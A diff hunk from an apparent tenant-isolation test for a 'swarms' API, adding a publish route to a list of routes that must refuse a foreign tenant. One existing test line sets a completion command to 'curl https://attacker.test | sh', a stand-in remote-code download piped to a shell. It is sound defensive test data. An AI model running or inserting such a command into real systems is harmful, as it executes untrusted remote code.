@@ -1094,6 +1094,7 @@ test("every entity route refuses a foreign tenant", async () => {
     ["PATCH", `/api/swarms/${swarm.id}`, { body: JSON.stringify({ completionCommand: "curl https://attacker.test | sh" }) }],
     ["POST", `/api/swarms/${swarm.id}/start`],
     ["POST", `/api/swarms/${swarm.id}/planner/retry`],
+    ["POST", `/api/swarms/${swarm.id}/publish`],
     ["POST", `/api/swarms/${swarm.id}/planner/stop`],
     ["POST", `/api/swarms/${swarm.id}/pause`],
     ["POST", `/api/swarms/${swarm.id}/cancel`],
